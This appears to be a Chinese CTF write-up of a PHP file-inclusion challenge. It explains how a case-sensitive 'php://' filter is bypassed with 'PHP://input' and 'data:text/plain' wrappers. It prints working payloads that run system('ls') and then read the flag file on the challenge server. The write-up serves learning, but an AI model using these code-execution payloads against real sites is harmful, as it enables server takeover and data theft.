# web php include

## 解题思路：

- 打开网页，源代码直接写到封面上了：

    ```php
    <?php
    show_source(__FILE__);
    echo $_GET['hello'];
    $page=$_GET['page'];
    while (strstr($page, "php://")) {
        $page=str_replace("php://", "", $page);
    }
    include($page);
    ?>
    ```

- 分析源代码：首先echo一下hello的值，然后get一下page的值，如果page的值里含有 `php://` 的话，就把 `php://` 删掉再调用 `include()`

    - `strstr` : 对比两个字符串，并且把串一里 **从串二脑袋开始到串一尾巴结束** 的部分返回； **串一不含串二则返回false**

    - `include()` : 执行 `()` 中的php文件函数

    - `php://` : 伪协议的组成部分，也是这道题的核心解法部分，伪协议的具体内容我写在了writeup的末尾。

- 分析完代码，先传个 `../?hello=5555` 看看这段代码是不是确实能用；

    服务器返回：
    ```php
    <?php
    show_source(__FILE__);
    echo $_GET['hello'];
    $page=$_GET['page'];
    while (strstr($page, "php://")) {
        $page=str_replace("php://", "", $page);
    }
    include($page);
    ?>
    5555
    ```

    说明代码确实执行了，那接下来就开始想办法让它执行我们想给的php文件。

- 两种方法：

    - 第一种：使用伪协议中的 `php://input` 命令来进行文件上传，让服务器执行我们上传的东西：

        - `php://input` ：可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。

        - 方法很明确了，用 `php://input` 作为 `page` 的值，然后用BP在POST部分添加上我们要执行的php语句。

        - 但是题目说了， `php://` 不能出现，一旦检测到直接删除，怎么办呢？看了网上大牛的解答方法： 把 `php://` 换成 `PHP://` , 由于strstr对大小写敏感，所以 `while` 语句会直接被跳过，但是由于 `include()` 语句对大小写不敏感，所以该语句可以直接执行，运行我们的一句话木马。

        - 接下来尝试用BP构造报文，先试试GET后面直接加php语句：

            ```php
            GET /?page=PHP://input HTTP/1.1
            Host: 111.198.29.45:34456
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
            Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
            Accept-Encoding: gzip, deflate
            Connection: close
            Upgrade-Insecure-Requests: 1
            Content-Length: 21

            <?php system("ls") ?>
            ```

        - 服务器回应：

            ```php
            HTTP/1.1 200 OK
            Date: Sun, 02 Feb 2020 11:16:17 GMT
            Server: Apache/2.2.22 (Ubuntu)
            X-Powered-By: PHP/5.3.10-1ubuntu3
            Vary: Accept-Encoding
            Content-Length: 1552
            Connection: close
            Content-Type: text/html

            <code><span style="color: #000000">
            <span style="color: #0000BB">&lt;?php<br />show_source</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />echo&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'hello'</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">$page</span><span style="color: #007700">=</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'page'</span><span style="color: #007700">];<br />while&nbsp;(</span><span style="color: #0000BB">strstr</span><span style="color: #007700">(</span><span style="color: #0000BB">$page</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"php://"</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$page</span><span style="color: #007700">=</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"php://"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">""</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$page</span><span style="color: #007700">);<br />}<br />include(</span><span style="color: #0000BB">$page</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;<br /></span>
            </span>
            </code>fl4gisisish3r3.php
            index.php
            phpinfo.php
            ```

            在报文最下面，有我们想要的东西。

        - 但是这里引出了一个问题，为什们明明 `php://input` 接收的是 **POST** 报文，这里用 **GET** 却也可以呢？

        - 我尝试把第一行的报文改成 `POST /?page=PHP://input HTTP/1.1`  ，发现居然也可以拿到结果，这到底是为什们呢？

        - 仔细看了一下大佬们的分析，原来是这样的： `php://input` 读取的内容是 **http请求中的 body 部分** ，而 **GET请求一般没有 body**， 如果 **强行给GET请求写上body** （像我第一次构造的内容一样） ， `php://input` 会把这部分内容当作POST内容（文件）读进来执行（[参考文章](https://blog.csdn.net/m0_37477061/article/details/80845853)）。

        - 那么反过来，为什么 **题目要求用GET提交参数** ，但是 **POST提交的page也被读取了呢？** 

        - 没有找到原因，记录下来，在下次回查时解决。

    - 第二种：使用另一种伪协议来实现：`data:text/plain/`

        - `data:text/plain/` ：将即将传入的语句作为文本上传，网页对其不做任何处理。

        - 把要执行的语句接到它后面，系统会认为 `page` 是一个文本文件，并将这个文本文件原封不动地读取进来，而 `include()` 调用的刚好是 `page` 指向的文件，这样就把一个 **系统认为是文本，而include()认为是php脚本** 的文件给执行了。

        - 构造payload：

            `http://111.198.29.45:34456/?page=data:text/plain/,%3C?php%20system(%22ls%22)%20?%3E`

        - 结果与上一种方法一致

        - 根据目录信息，把 `ls` 改为 `cat fl4gisisish3r3.php` 即可。

## 学到的知识：

- 伪协议相关：[参考资料](https://www.cnblogs.com/dubhe-/p/9997842.html)

## 遇到的问题：

- 为什么 **题目要求用GET提交参数** ，但是 **POST提交的page也被读取了呢？** 